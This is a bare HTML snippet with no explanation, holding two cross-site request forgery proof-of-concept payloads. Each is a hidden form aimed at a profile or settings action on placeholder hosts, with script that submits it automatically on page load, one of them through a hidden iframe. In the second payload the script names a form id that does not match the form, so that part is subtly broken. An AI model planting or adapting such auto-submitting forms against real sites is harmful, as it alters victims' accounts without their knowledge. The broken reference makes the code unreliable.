<form name="blop" action="http://xxx.com/xxxx/?action=profile" method="post" enctype="multipart/form-data"> 
<input type="hidden" name="username" value="testtest">
<input type="hidden" name="status" value="on">
<script>document.blop.submit()</script>



<iframe style="display:none" name="blop-frame"></iframe>
    <form  id="csrf-form" target="blop-frame" action="http://xxx.org/xxxx/index.php?action=top" method="POST" enctype="multipart/form-data">
      <input type="hidden" name="username" value="user" />
      <input type="hidden" name="status" value="on" />
      <input type="submit" value="Submit request" />
    </form>
<script>document.getElementById("blop-form").submit()</script>
